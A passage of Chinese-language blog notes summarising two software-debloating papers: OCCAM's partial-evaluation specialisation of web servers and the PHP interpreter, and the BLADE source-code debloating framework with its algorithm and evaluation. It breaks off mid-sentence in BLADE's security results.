tabindex="-1">2.3 动态检查</h4><ul><li>当我们能够在组件中静态确定接口的时候，简化效率最高。</li><li>然而在某些情况下，比如通过函数指针进行调用时，确定函数如何调用将会变得困难。例如，在面向对象语言中进行动态分派或在动态语言的解释器中查找函数表时，以下说明一个实例</li></ul><pre><code class="language-C">extern int (*foo)(int);extern int (*bar)(int);void go(bool foobar) &#123;    int (*f)(int) = foobar ? foo : bar;    f(2);     f(3);&#125;</code></pre><ul><li>此代码中，我们只知道 foo 和 bar 会以参数2，3调用，但重写代码并不简单，因为我们在对f的调用中要实用不同的函数。 在这里，我们必须要构建一个包装函数来检查参数并根据需要调度到特化版本，或者在违反接口时发出错误信号，以保持相同的二进制级别的接口。</li><li>这里有两个潜在位置执行动态检查，在调用点或者函数定义处，各有不同的好处</li></ul><h5 id="2.3.1-%E9%87%8D%E5%86%99%E5%AE%A2%E6%88%B7%E7%AB%AF" tabindex="-1">2.3.1 重写客户端</h5><p>第一种选择是重写客户端，即在调用点执行检查。<br>此时，库只导出特化函数（foo_2 和 foo_3 ），但客户端同时需要非特化的。为此，我们必须通过测试其参数并将其分配到合适的特化函数中来实现通用函数。如在客户端模块实现foo如下</p><pre><code class="language-C">extern int foo_2();extern int foo_3();inline int foo(int x) &#123;    if (x == 2) return foo_2(); // foo(2)    if (x == 3) return foo_3(); // foo(3)    exit(1);&#125;</code></pre><ul><li>对客户端进行部分估值将导致该调用被内联，并且在x是静态已知的情况下删除条件。对于调用不符合接口的代码，将执行fall-through并发出错误信号</li></ul><h5 id="2.3.2-%E9%87%8D%E5%86%99%E5%BA%93" tabindex="-1">2.3.2 重写库</h5><ul><li>另一种选择是重写库中的目标函数，这对于强制执行，无法静态验证的 库的接口很有用<br>。它还可以在单独模块中进行使用，以解决间接调用的困难那，为此，OCCAM复制了旧的foo实现并进行重写</li><li>我们将导出的函数foo替换为一个检查参数的函数（以强制执行foo只能用2，3调用），并相应的进行委托或终止客户端。 由于oldfoo在库中是内部的，有static修饰，模块内的简化将对其进行特化并最终从执行文件中删除通用版本</li></ul><pre><code class="language-C">int foo(int x) &#123;    if (x == 2) return oldfoo(2);    if (x == 3) return oldfoo(3);    exit(1);&#125;static int oldfoo(int x) &#123; /* foo code */ &#125;</code></pre><h3 id="3-%E5%AE%9E%E7%8E%B0" tabindex="-1">3 实现</h3><ul><li><p>我们实现了我们描述的所有技术，并应用于多个实例，以了解在实际应用中实用简化技术的实用性</p></li><li><p>我们的代码作为一组LLVM编译器传递实现的。我们通过一组Python包装器实用LLVM opt程序运行它。这意味着简化的每个简短都会产生一个新的程序文件（或接口文件）。虽然这种方法不如纯C但不实体化中间结果的效率高，但它能够灵活地尝试其它转化和特化的启发式方法，我们的代码发布提供了一个教程，演示了我们如何使用我们的工具对应用程序进行简化</p></li><li><p>为了创建程序的bit码，我们开发了一组脚本来包装现有的构建工具，这是因为大型应用程序的构建过程通常使用各种工具，如autoconf，libtool，cmake，make。 虽然这些工具支持各种平台和配置，但不支持将LLVM bit码作为目标架构</p></li><li><p>为了与检查依赖项的现有构建脚本集成，我们的工具将每个命令翻译成两个命令（如调用gcc或ld）。</p><ul><li>第一个编译产生一个修改的版本来获取LLVMbit码</li><li>第二个生成ELF标准版本，生成ELF对象确认构建成功，并确保所有的依赖选项都存在。</li></ul></li><li><p>虽然在构建速度方面不太理想，但我们的脚本相当健壮，能够编译大型程序和库，如PHP，SQLite，uClibc</p></li></ul><h3 id="4-%E4%BE%8B%E5%AD%90%E7%A0%94%E7%A9%B6" tabindex="-1">4 例子研究</h3><ul><li><p>首先回顾我们的目标</p></li><li><p>首先，我们希望减少代码的功能，但这不一定意味着代码的减少；相反，它可能意味着减少可能的执行次数，复制一个函数会增加代码大小，但不会增加复杂性。同样地。在一个参数上特化一个函数，可以通过限制传递的值来减少其可能的行为。为了衡量这一点，我们可以查看应用程序在简化前后的调用图。</p></li><li><p>次要目标是代码大小的减少和配置复杂性。</p><ul><li>大型库支持在粗粒度上启用功能，例如PHP中支持MySQL。</li><li>简化为库用户提供了一种自动化方式，来精确地选择它们想要地功能。为衡量这一点，我们可以将简化与现有技术进行比较，例如使用库地静态链接（仅使用存档中的必要对像）</li></ul></li><li><p>我们的例子研究包括两个web服务器，nweb[3],thttpd[9],及两个web应用程序使用的PHP解释器</p></li></ul><h4 id="nweb" tabindex="-1">nweb</h4><ul><li><strong>nweb</strong>是一个静态内容Web服务器，只有200多行C代码，它的大小和架构并不是简化的理想对象（小且配置少），但其可以展示简化的实际效果。 因为nweb仅依赖于libc，且非常简单，uClibc足以满足它的需求 （libc和uClibc都是C标准库，但uClibc是面向嵌入式系统的轻量级库）</li><li>由于nweb通过命令行进行配置，我们根据我们希望提供的参数对main函数进行特化。为此我们使用命令<code>nweb 8080 /root</code> 告诉nweb监听端口并从root提供文件<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_5.png" alt="image"></li><li>上图展示了简化对nweb调用图的影响，图中的粗灰色框表示特化的函数。 简化前有27个函数，简化后只有17个，其余10个被特化或内联到11个不同的函数中，每个特化都减少了至少一个参数。这些特化包括<ul><li><ol><li>log函数被复制了三次，每次都因不同的状态可以打印日志。通用函数已被删除，特化实例的部分求值去除了怪异的控制流，变成straight-line code程序（只有顺序结构），使其可以直接调用sprint，open，write</li></ol></li><li><ol start="2"><li>libc中设置socket的函数（bind，listen和socket）每个被特化为处理TCP请求。其中socket函数最有趣，被特化为 面向 Internet（AF_NET） 和 面向流的socket（SOCK_STREAM）</li></ol></li><li><ol start="3"><li>libc中处理软件中断的函数（signal）被特化两次以处理SIGCHLD和SIGHUP，这些特化可以使得其他工具可以轻松地确认程序仅以有限的方式响应中断</li></ol></li></ul></li></ul><h4 id="thttpd" tabindex="-1">thttpd</h4><ul><li><strong>thttpd</strong>是另一个考虑的Web服务器。其有许多功能，约8500行C代码，支持CGI，在启动时使用chroot，在内存中缓存，使用htpasswd身份验证。除了核心的libc功能外，thttpd还连接到libcrypt以保护其.htpasswd文件，httpd可以在运行时通过命令行参数配置，也可以在编译时使用一个头文件进行配置，该头文件同构一组49个宏控制代码生成。这些宏包括我们希望在简化中公开的，如.htpasswd的路径存储在AUTH_FIL宏中</li><li>对thttpd进行简化会产生125个特化函数，主要分为三类<ul><li>定时器创建（tmr_create）的特化：所有这些调用都会被特化，包括在计时器到期时运行的函数指针。 这可以防止数据攻击。</li><li>缓冲区分配（httpd_realloc_str）:一个调用扩展了用于存储标头的缓冲区大小，该调用对前领个参数进行了特化，因为二者都是全局变量的地址 。<code>httpd_realloc_str(&amp;header, &amp;maxheader, sizeof(headerstr) + strlen(realm) + 3);</code></li><li>错误代码的特化。 因为我们的特化框架不支持可变参数函数，因此我们无法特化错误函数中对 snprintf的调用。 然而，常量的传播可以进行，因此，可以通过额外的特化来注入这些常量所需的特化</li></ul></li></ul><h4 id="php" tabindex="-1">PHP</h4><ul><li>PHP [14] 是一个用于网站的流行编程语言。它附带了一个庞大的标准库，涵盖了从简单的字符串和日期操作到像chroot这样的POSIX系统调用的各种功能。这种“一揽子式”方法对于快速启动新应用程序非常有用。同时，这也为攻击提供了广泛的攻击面，特别是对于使用eval的应用程序。为了解决这个问题，我们可以对托管应用程序不需要的 PHP 运行时功能进行剪裁。</li><li>为了演示这一点，我们构建了一个minblog[13]专用的PHP解释器，这是一个用PHP编写的小型博客框架。我们用我们的工具链自动地构建PHP解释器的LLVM二进制位码。在编译后，我们需要确定miniblog需要的接口，这里有两个复杂问题<ul><li><ol><li>首先PHP以文本形式提供给PHP解释器，这意味着我们无法使用LLVM通道来确定运行应用程序所需要的接口。PHP的静态评估超出了本文的范围。因此我们使用正则表达式来捕捉与PHP函数调用语法相对应的文本模式。之后，我们人工地检查结果，这个过程可以由语义的静态分析和在程序运行时记录跟踪的工具来替代。即便使用这些工具，我们认为由手动审核此列表仍然是有用的，以查看底层系统所依赖的内容。</li></ol><ul><li>从静态分析我们可以确定miniblog依赖于PHP标准库中地52个函数，包括包括字符串和文件操作以及 MySQL 函数。为了比较，我们编译了可以使用 PHP 的编译选项配置的最小解释器（包括 PHP 标准库和 MySQL 扩展）的解释器。这包含 1029 个函数，包括可能危险的函数，如 system 和 mail。一些被消除的函数包含过去 PHP 版本中的漏洞（CVE-2011-1148 和 CVE-2010-2191）。这些漏洞在已经进行了精简的 PHP 部署中将不再存在。</li></ul></li><li><ol start="2"><li>第二个问题是PHP解释器的架构。PHP解释器讲库函数实现存储在一个可以动态调度的表中。因此，通过此表中的函数进行的所有调用都太过保守，所有函数都有可能是目标。即使我们可以使用类似 Smowton [12] 开发的技术将 PHP 代码拉入部分评估期间，使用 LLVM 优化器很难实现解决通过此表调用所需的部分评估。取而代之的是，我们注意此表的结构并使用第 2.3 节中描述的技术修改函数。在标准的 PHP 解释器中，每个库例程 Xxx 都在函数 zif_Xxx 中实现。因此，我们可以轻松编写钩子，将未使用的函数重写为错误。</li></ol></li></ul></li><li>对简化miniblog，生成了997个形如<code>zif_system(?) =&gt; fail</code>的重写，处于审计和调试的目的，我们实现fail函数时记录了违规的函数调用</li></ul><h3 id="5-%E8%AF%84%E4%BC%B0" tabindex="-1">5 评估</h3><h4 id="%E6%80%A7%E8%83%BD" tabindex="-1">性能</h4><ul><li><p>我们比较了使用专门化和不使用专门化构建的每个服务器在请求率上的表现，以了解运行时的影响。</p></li><li><p>性能以每秒请求数来衡量，用于提供单个小型静态页面。</p></li><li><p>为了控制网络带宽，我们在 localhost:8080 上执行了测试。</p></li><li><p>我们使用 Apache 基准测试工具 ab 来生成请求。</p></li><li><p>我们运行了 40 次试验，每次对服务器进行 5000 次请求。</p></li><li><p>测试在一台轻度负载的 Intel Core 2 四核桌面上运行，时钟频率为 2.4 GHz，配备 4 GB 的 RAM 和 Linux 2.6.38，并使用 TuxOnIce 补丁集</p></li><li><p>为了进行公平比较，基线在链接之前使用LLVM-O3进行优化，两个版本都静态链接到uClibc-0.9.32，使用OCCAM构建并使用uClibc构建的标准配置选项进行优化（使用-O2）。</p></li><li><p>下图显示了nweb和thttpd的比较结果<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_6.png" alt="image"></p></li><li><p>nweb中差异在样本中变化较大，不具有统计意义</p></li><li><p>thttpd中，简化版本在95%的置信度上高于基线版本。这种性能改善可能有两个原因造成</p><ul><li>简化使用-O3作为其部分求值器，而标准配置使用-O2。这种差异可能会导致简化版本的代码更快。</li><li>函数的复制暴露了常量，创造了更多的编译时优化机会</li></ul></li></ul><h4 id="%E4%BB%A3%E7%A0%81%E5%A4%A7%E5%B0%8F" tabindex="-1">代码大小</h4><ul><li>我们在简化中使用的激进特化策略导致httpd模块大小增加了45%，如下图示，这是部分评估技术已知的问题，其中大部分由于报错函数特化参数的复制引起的。这个问题可以使用更保守地启发式搜索解决，如果产生了显著的差异，其只会保留一个特化，</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_7.png" alt="image"></p><ul><li>libcrypt和libc模块的二进制大小在简化后几乎没有增加，这是因为大多数函数都是叶子例程（例如字符串操作）或它们立即调用操作系统。因此，在这些单独的模块中，很少有机会内联或特化函数。额外的大小是由于对库的特化调用减去了静态链接器引入，但thttpd模块未使用的额外函数和常量。在高度优化的低级别库中，这些都不是显著的，因为档案中的每个对象通常只定义了最小数量的函数。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_8.png" alt="image"></p><ul><li>许多常见的库，如libc，通常被编译为共享对象（或系统等效物），而不是静态链接。正常的共享对象包含整个库，与这样的库动态链接的任何应用程序都会引入大量不相关的功能。通过在构建共享对象之前应用精简，我们可以大大减少这种情况。</li></ul><p><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(10)_9.png" alt="image"></p><ul><li>图9展示了应用第4节技术于PHP的结果。<ul><li>min表示使用PHP编译配置选项可以构建的最小PHP模块。它的大小为5.5 MB，其中4.0 MB（用虚线标记）是解释器（没有导出的PHP函数）。剩下的1.5 MB是标准库。</li><li>+mysql表示添加了MySQL支持的二进制文件。它需要额外的4%存储（不包括MySQL库）。</li><li>+mysql-sys是添加了一个策略以阻止对11个危险的PHP函数的调用后的二进制文件。</li><li>miniblog表示在对miniblog的接口进行精简之后得到的解释器版本。在模块内精简之后，LLVM比特码的大小从5.8 MB缩小到4.2 MB，减少了27%；这只比核心解释器大5.5%。从精简中减小PHP解释器二进制大小的效果类似于我们在thttpd案例中看到的libc共享对象的最小化（如图8所示）。</li></ul></li></ul><h3 id="6-%E7%BB%93%E8%AE%BA" tabindex="-1">6 结论</h3><ul><li>我们开发了OCCAM工具,用于将应用程序特化到其部署环境</li><li>我们解释了为什么我们的工具可以精确地从应用程序中移除功能</li><li>我们还认为,少量的手动工作可以用于解决优于信息的不完整引起的困难(如,不知道解释器正在运行的程序或不精确的别名分析)</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SoftwareEngineering </tag>
            
            <tag> SoftwareDebloating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Software Debloating 论文阅读 (7)</title>
      <link href="/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(7)/"/>
      <url>/2024/01/15/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/SoftwareDebloating/Software%20Debloating%20%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB(7)/</url>
      
        <content type="html"><![CDATA[<h2 id="blade%3A-scalable-source-code-debloating-framework" tabindex="-1">BLADE: Scalable Source Code Debloating Framework</h2><p>2023 IEEE Secure Development Conference</p><p>Ali M, Habib R, Gehani A, et al. BLADE: Scalable Source Code Debloating Framework[J]. 2023 IEEE Secure Development Conference (SecDev),2023</p><h3 id="0-%E6%91%98%E8%A6%81" tabindex="-1">0 摘要</h3><ul><li>现有的源代码精简工具在动态云环境中应用时存在可扩展性低和运行时开销高的问题，其中实例会即时启动 （指明场景）</li><li>为了解决这一挑战，我们提出了BLADE，它利用常见的编码习惯和语言限制构建简单而有效的启发式方法，以实现更快的源代码精简<ul><li>例如：通常在使用之前定义变量，因此删除节点时，其在语法树的位置越深，破坏代码的概率越低；</li><li>例如：在精简某些功能时，基本块中的语句可能会被一起删除</li></ul></li><li>为此，Blade使用分层源代码简化，通过反向谦虚遍历选择简化候选，以便在定义之前删除使用</li><li>低运行开销使得BLADE能够实际应用于大型工作负载的代码精简</li><li>我们的评估表明，与现有的源代码精简工具相比，BLADE运行更快。<ul><li>与 Chisel 相比，BLADE平均快2.3倍，并在代码大小和攻击面的减小方面提供可比较的效果。</li><li>与另一款源代码精简工具 Debop 相比，BLADE平均快2.75倍。</li><li>（然而这两款都很慢）</li></ul></li></ul><h3 id="1-%E4%BB%8B%E7%BB%8D" tabindex="-1">1 介绍</h3><ul><li><p>简化工具需要的性质</p><ul><li><ol><li>快速且可拓展,同时不损害通用性</li></ol><ul><li>动态云环境中,实例会即时启动,因此需要快速的精简工具</li><li>CI/CD中,需要即时提供更新的构建</li></ul></li><li><ol start="2"><li>可审计性:</li></ol><ul><li>允许在精简后检查生成的代码是否存在任何意外的副作用。不在源代码级别操作的精简工具[2]，[4]–[6] 对于这种用例不太理想。</li></ul></li></ul></li><li><p>基于源代码简化方案的工作原理</p><ul><li><ol><li>创建测试规范描述所需的功能</li></ol></li><li><ol start="2"><li>迭代地选择要从代码库中删除的一组代码语句的候选集</li></ol></li><li><ol start="3"><li>将剩余的代码与规范进行测试。</li></ol><ul><li>如果通过，就永久性地删除所选的语句。然后继续对剩余的代码进行搜索。</li><li>如果测试失败，将那些选定的语句放回代码库，并考虑一个新的候选语句集，直到所有集合都用尽。</li></ul></li></ul></li><li><p>当今的简化方法很慢,甚至超时[1]，[7]–[9],它们常规地使用Delta-Debugging进行搜索,复杂度为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></eq> ;而Debop[7]使用随机优化进行搜索,然而其精简效率较低</p></li><li><p>为此我们提出BLADE,支持快速且可扩展的代码精简</p><ul><li>BLADE采用了一个结构感知的代码精简过程，其运行时间为 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq>,这使得将 BLADE 用于精简大型代码库（例如 nginx、sqlite3）变得实际可行。</li><li>BLADE在源代码级别上操作，以实现可审计性。</li></ul></li><li><p>评估表明,BLADE比 Chisel 快 2.3 倍，比 Debop 快 2.75 倍.</p></li><li><p>总的来说, 高度的代码精简、安全强化和低运行时开销的通用潜力使得 BLADE 在现代动态精简使用案例中更具有优势。</p></li><li><p>本文贡献如下</p><ul><li><ol><li><strong>新颖方法</strong>：BLADE利用其快速算法，有效地扩展到大型工作负载（例如，nginx、sqlite3）。这使得BLADE成为现实工作负载的实际解决方案。</li></ol></li><li><ol start="2"><li><strong>全面评估</strong>：与现有的精简框架进行的比较评估显示，BLADE在精简时间上相比其他方案有显著改进，而不会牺牲代码精简。</li></ol></li><li><ol start="3"><li><strong>开源</strong>:<a href="https://github.com/pawnsac/BLADE-deb">仓库地址</a></li></ol></li></ul></li></ul><h3 id="2-%E5%8A%A8%E6%9C%BA%E5%92%8C%E8%A7%81%E8%A7%A3" tabindex="-1">2 动机和见解</h3><ul><li><p>DD算法低效的两个原因</p><ul><li><ol><li>可以被简化的语句可能分散而不是成片出现.因此,搜索可移除代码的最大片段所需的时间潜在地可能超过实际删除大块代码所带来的可能时间优势</li></ol></li><li><ol start="2"><li>没有考虑编程语言的语法规则</li></ol><ul><li>例如:在候选删除集中包含一个定义语句,在未删除的代码中有其应用,此时不能够删除该定义语句. 这样会产生语法错误,且编译这样的代码也是不必要的,编译这样代码浪费的时间可以通过在删除语句的定义之前优先删除其应用来避免</li></ul></li></ul></li><li><p>见解1:利用先定义后使用的结构</p><ul><li>通常,变量先定义后使用,因此在语法树中,被删除的语句未知越深,出现错误概率越低</li><li>因此BLADE利用这一见解优化迭代次数,因为DD是优删除前部分的定义语句,而BLADE优先删除后部分的定义语句</li></ul></li><li><p>见解2:利用语法树层次结构</p><ul><li>给定一个包含多个语句的代码块,可以在考虑其中单个语句之前先把整个语句删除</li><li>而DD采用二分搜索移除大块,BLADE利用这一见解可以加快速度</li></ul></li></ul><h3 id="3-%E7%B3%BB%E7%BB%9F%E8%AE%BE%E8%AE%A1" tabindex="-1">3 系统设计</h3><ul><li>形式化定义:类似Chisel等</li><li>简化流程如下</li></ul><ol><li>识别并从程序中删除一组候选语句。</li><li>编译剩余的程序。</li><li>测试 Oracle 执行程序所需的功能。</li><li>测试 Oracle 比较程序输出与预期输出。</li><li>根据测试 Oracle 的结果，候选语句要么被永久性地删除（精简），要么重新引入到程序中。这个过程重复进行，直到精简算法无法进一步精简程序。</li></ol><ul><li>系统总体设计如下,下面进行详细介绍<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_1.png" alt></li></ul><h4 id="a-%E8%AF%AD%E5%8F%A5%E6%A0%91" tabindex="-1">A 语句树</h4><ul><li>对于给定的程序简历语句树,不同于AST,其叶子节点是完整的语句,中心节点是代码块(如函数,循环,if-else语句或结构体).</li><li>BLADE将语句块保留为内部节点以进行分层简化:删除内部节点及其子树等效删除整个代码块,删除后如未通过测试,则将该块重新放回1,并在该块中反向遍历进行DD</li><li>下图为一个语句树例子<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_2.png" alt="语句树"></li><li>构建语句树使用LLVM的前端Clang [12]提取原始代码的token,随后使用这些token构建语句数,并分类为块或语句</li></ul><h4 id="b-%E7%AE%80%E5%8C%96%E7%AE%97%E6%B3%95" tabindex="-1">B 简化算法</h4><ul><li>简化算法以语句树为输入,递归地进行简化. 其以后序遍历语句树,没有并行优化的基本算法如下</li><li><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_3.png" alt="基本算法"><ul><li>首先尝试删除整个树来简化(第2行),否则回复树(第5行)</li><li>该算法对于每个节点只遍历一遍,因此复杂度是 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></eq></li></ul></li></ul><h4 id="c-%E5%B9%B6%E8%A1%8C%E6%93%8D%E4%BD%9C" tabindex="-1">C 并行操作</h4><ol><li><strong>同时多节点简化</strong>:在一次迭代中同时处理给定节点下的多个子节点</li></ol><ul><li>具体来说在多个进程中运行算法1,并行移除不同组合的子节点,通过测试集的删除最多的是最佳状态,此外永久删除节点更新全局状态</li><li>算法如下图所示 <img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_4.png" alt="并行算法"><ul><li>第5,6行为进程分配节点</li><li>第7行进程并行删除分配的节点,并测试</li><li>最佳简化在15行确定</li><li>n是节点的子节点数,有 <eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">2^n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span></span></span></eq> 种组合,我们依据 <strong>见解1</strong> 进行排序.在原型实现种,我们只考虑前n种组合</li><li>在给定节点，BLADE选择第一个即将到来的节点作为第一个进程的候选集；第二个进程获得前两个即将到来的节点，依此类推，第n个进程获取前n个即将到来的节点作为运行算法1的候选集。</li></ul></li><li>多节点并行主要有两个好处<ul><li><ol><li>速度:可以在一次迭代种删除更大的代码块,例如并行5个进程可一次删除5个节点.下图标明,在67.6%的情况下,一次迭代删除的语句多余一个 <img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_5.png" alt="并行删除"></li></ol></li><li><ol start="2"><li>简化:允许多节点组合简化,这在移除具有中和作用代码时有帮助</li></ol></li></ul></li></ul><ol start="2"><li><strong>次级减小</strong>:</li></ol><ul><li>BLADE仅使用一组优先级高的组合,因此始终存在次级迭代能产生更多的简化.</li><li>为此,我们运行另外一组进程执行次级同时遍历,有以下目的<ul><li><ol><li>在第一轮简化后制作 新一轮的简化组合</li></ol></li><li><ol start="2"><li>死代码清除(包括删除标签定义,不遵循先定义后使用原则)</li></ol></li></ul></li><li>这些次级迭代使用不同程度的语句树执行算法2,然而保持至少一个函数的并行迭代器之间的距离是重要的,原因有两个<ul><li><ol><li>使得多个迭代器的简化路径不重叠</li></ol></li><li><ol start="2"><li>允许迭代器为下一个迭代器创建新的简化组合之前能够全面搜索函数.</li></ol></li></ul></li><li>BLADE提供了调整并行迭代器及其调整进程数量的功能.使用多个迭代器减少了对程序执行多次完整遍历的需求,显著提高了代码简化水平</li></ul><h4 id="d-%E6%B5%8B%E8%AF%95oracle" tabindex="-1">D 测试Oracle</h4><ul><li><strong>功能检查器</strong>:<ul><li>使用一组测试脚本(bash脚本),测试脚本需要完全覆盖核心功能</li><li>程序相对于给定功能的通用性被定义为程序处理指定功能的一般范围输入的适应性. 为了增加通用性会增加输入,导致时间增加,通过优化迭代次数,BLADE使得更好的通用性称为可能</li></ul></li><li><strong>适应检查器</strong>:<ul><li>维系简化程序的质量,如安全性评估等</li><li>目前实现种,使用Clang静态分析来保证简化适应度如[1]中所实现。<ul><li>控制流完整性（Control Flow Integrity）Sanitizer</li><li>地址（Address）Sanitizer</li><li>内存（Memory）Sanitizer</li><li>未定义行为（Undefined Behavior）Sanitizer</li><li>泄漏（Leak）Sanitizer，</li></ul></li></ul></li></ul><h3 id="4-%E8%AF%84%E4%BC%B0" tabindex="-1">4 评估</h3><ul><li>与Chisel,Razor,Debop比较</li></ul><h4 id="a-%E6%A0%87%E5%87%86" tabindex="-1">A 标准</h4><ul><li><strong>分析效率</strong>:运行时间表现对比</li><li><strong>简化</strong>:</li><li><strong>安全</strong>:</li><li><strong>通用性</strong></li></ul><h4 id="b-%E8%AF%84%E4%BC%B0%E9%A1%BA%E5%BA%8F" tabindex="-1">B 评估顺序</h4><ul><li><ol><li>在小程序上对比</li></ol></li><li><ol start="2"><li>在大的应用程序上对比,着重体现了BLADE的优势:在实际工作负载上的可扩展性</li></ol></li></ul><h4 id="c-%E8%AF%84%E4%BC%B0%E7%8E%AF%E5%A2%83" tabindex="-1">C 评估环境</h4><ul><li>Linux Server</li><li>2个 Xeon Silver 4210 CPU@2.20GHz处理器</li><li>512GB DDR4</li><li>操作系统为Ubuntu 20.04.4 LTS</li></ul><h4 id="d-%E8%AF%84%E4%BC%B0%E9%85%8D%E7%BD%AE" tabindex="-1">D 评估配置</h4><ol><li><strong>目标程序和功能选择</strong>:</li></ol><ul><li>使用 nginx、sqlite3、make 和 tar 作为大型程序样本，以衡量可扩展性。</li><li>使用ChiselBench作为小程序样本</li><li>选择每个程序的核心参数,需要保证功能检查其全面覆盖了程序的各种输入范围.<ul><li>例如:对于sort,uniq,输入包括文本,二进制,图像和压缩文件</li></ul></li></ul><ol start="2"><li><strong>设置BLADE,Chisel,Debop和Razor</strong></li></ol><ul><li>使用相同测试Oracle对于所有工具,并针对各自修改<ul><li>Razor需要Oracle为python</li><li>Debop要求每次结束时输出一组测量值,还要两个参数</li></ul></li></ul><h4 id="e-%E5%88%86%E6%9E%90%E6%95%88%E7%8E%87%E8%AF%84%E4%BC%B0" tabindex="-1">E 分析效率评估</h4><ul><li>ChiselBench种,BLADE平均比Chisel快2.3倍,比Debop快2.75倍;</li><li>这使得它能够扩展到大型代码库，并鼓励添加更复杂的测试用例到测试 Oracle 中。</li></ul><h4 id="f-%E7%AE%80%E5%8C%96%E8%AF%84%E4%BC%B0" tabindex="-1">F 简化评估</h4><ul><li>从4个维度出发<ul><li>二进制大小:<ul><li>BLADE平均减少 67%</li><li>Chisel 67%</li><li>Debop 7%</li><li>Razor -19%:因为razor会将之前的设为只读而添入新的代码块<br><img src="../../../images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_6.png" alt="二进制大小"></li></ul></li><li>运行代码大小:<ul><li>BLADE减少 83%</li><li>Chisel 86%</li><li>Razor 50%</li><li>Debop 10%<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_7.png" alt="运行代码大小"></li></ul></li><li>静态块<ul><li>BLADE减少 86%</li><li>Chisel 88%</li><li>Razor 45%</li><li>Debop 7%<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_8.png" alt="静态块"></li></ul></li><li>代码行<ul><li>BLADE减少 83%</li><li>Chisel 76%</li><li>Debop 1%</li><li>注意到从Chisel到BLADE代码行数有显著的减少,主要有以下BLADE考虑了但Chisel没有的两个原因<ul><li><ol><li>未使用声明的减少</li></ol></li><li><ol start="2"><li>结构体的减少<br><img src="/images/%E8%AE%BA%E6%96%87/software%20debloating%20%E8%AE%BA%E6%96%87/(7)_9.png" alt="代码行数"></li></ol></li></ul></li></ul></li></ul></li></ul><h4 id="g-%E5%AE%89%E5%85%A8%E8%AF%84%E4%BC%B0" tabindex="-1">G 安全评估</h4><ul><li>从三个方面考虑<ul><li><ol><li>ROP Gadgets:使用Salwan的ROP Gadget工具[13]计算总共的唯一ROP gadgets.</li></ol><ul><li>BLADE减少 83%</li><li>Chisel 84%</li><li>Razor 